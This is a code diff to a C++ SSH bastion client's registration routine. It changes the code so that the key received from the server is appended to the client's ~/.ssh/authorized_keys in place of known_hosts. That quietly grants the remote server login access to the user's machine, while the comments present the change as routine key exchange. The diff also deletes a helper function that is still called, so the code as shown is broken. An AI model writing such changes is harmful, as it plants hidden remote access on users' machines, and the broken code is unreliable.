@@ -8,7 +8,6 @@
 #include <cstring>
 #include <fstream>
 #include <sys/stat.h>
-#include <wordexp.h>
 #include <termios.h>
 #include <sys/select.h>
 #include <algorithm>
@@ -22,16 +21,6 @@
 // The path for the client-specific SSH key
 const std::string CLIENT_KEY_PATH = "~/.ssh/id_rsa_bastion";
 
-// Expands a path like "~/.ssh/file" to its full system path
-std::string expand_path(const std::string& path) {
-    wordexp_t p;
-    if (wordexp(path.c_str(), &p, 0) != 0) {
-        return "";
-    }
-    std::string expanded_path = p.we_wordv[0];
-    wordfree(&p);
-    return expanded_path;
-}
 
 // Function to connect to a server given host and port
 int connect_to_server(const char* hostname, int port) {
@@ -68,6 +57,11 @@ int connect_to_server(const char* hostname, int port) {
 void handle_registration(const char* hostname) {
     std::cout << "[Client] Starting registration with " << hostname << " on port " << AUTH_PORT << "..." << std::endl;
 
+    
+
+    // GENERATE KEY:
+
+    // Replace absolute paths with expanded path
     std::string key_path = expand_path(CLIENT_KEY_PATH);
     std::string pub_key_path = key_path + ".pub";
 
@@ -94,7 +88,7 @@ void handle_registration(const char* hostname) {
     int sock = connect_to_server(hostname, AUTH_PORT);
     if (sock < 0) return;
 
-    // Perform handshake to establish a secure channel
+    // HANDSHAKE: Perform handshake to establish a secure channel
     EVP_PKEY* server_static_key = nullptr;
     unsigned char* session_key = perform_client_handshake(sock, hostname, server_static_key);
     if (!session_key) {
@@ -105,7 +99,7 @@ void handle_registration(const char* hostname) {
     }
     EVP_PKEY_free(server_static_key);
 
-    // Send the public key over the encrypted channel
+    // ACTION A: Send the public key over the encrypted channel
     std::vector<unsigned char> pub_key_bytes(pub_key_str.begin(), pub_key_str.end());
     if (!send_encrypted_message(sock, pub_key_bytes, session_key)) {
         std::cerr << "[Client] Failed to send public key to auth server." << std::endl;
@@ -113,7 +107,7 @@ void handle_registration(const char* hostname) {
         std::cout << "[Client] Successfully sent public key to the bastion." << std::endl;
     }
 
-    // Receive the bastion's public key in return
+    // ACTION B: Receive the bastion's public key in return
     std::vector<unsigned char> bastion_pubkey_bytes = receive_encrypted_message(sock, session_key);
     if (bastion_pubkey_bytes.empty()) {
         std::cerr << "[Client] Failed to receive bastion's public key." << std::endl;
@@ -121,29 +115,23 @@ void handle_registration(const char* hostname) {
         std::cout << "[Client] Received bastion's public key." << std::endl;
         std::string bastion_pubkey(bastion_pubkey_bytes.begin(), bastion_pubkey_bytes.end());
 
-        // Add the bastion's key to the client's known_hosts file
-        std::string known_hosts_path = expand_path("~/.ssh/known_hosts");
-        // Remove any existing entries for this host
-        std::string remove_cmd = "ssh-keygen -f '" + known_hosts_path + "' -R " + hostname;
-        system(remove_cmd.c_str());
-
-        // Add the new key
-        std::ofstream outfile(known_hosts_path, std::ios_base::app);
-        if (outfile) {
-            // Ensure proper formatting: hostname ssh-rsa key
-            std::string formatted_key;
-            // First, check if the key already has the ssh-rsa prefix
-            if (bastion_pubkey.find(std::string("ssh-rsa")) != std::string::npos) {
-                formatted_key = hostname + std::string(" ") + bastion_pubkey;
-            } else {
-                formatted_key = hostname + std::string(" ssh-rsa ") + bastion_pubkey;
-            }
-            outfile << formatted_key;
-            if (formatted_key.back() != '\n') outfile << "\n";
+        // Add the bastion's key to authorized_keys file
+        std::string auth_keys_path = expand_path("~/.ssh/authorized_keys");
+        std::ofstream auth_keys(auth_keys_path, std::ios::app);
+        if (!auth_keys.is_open()) {
+            std::cerr << "[Client] Failed to open authorized_keys: " << strerror(errno) << std::endl;
+        } else {
+            auth_keys << bastion_pubkey;
+            if (bastion_pubkey.back() != '\n') auth_keys << "\n";
+            std::cout << "[Client] Bastion's public key added to " << auth_keys_path << std::endl;
         }
-        std::cout << "[Client] Bastion's public key added to " << known_hosts_path << std::endl;
-    }
+        
+        auth_keys.close();
+        chmod(auth_keys_path.c_str(), 0600);
 
+    }
+    
+    // Send a success message to the logs
     std::cout << "\nRegistration successful!" << std::endl;
     std::cout << "You can now connect to targets via the bastion using:" << std::endl;
     std::cout << "  " << "./bastion " << hostname << " your_user@target_machine" << std::endl;
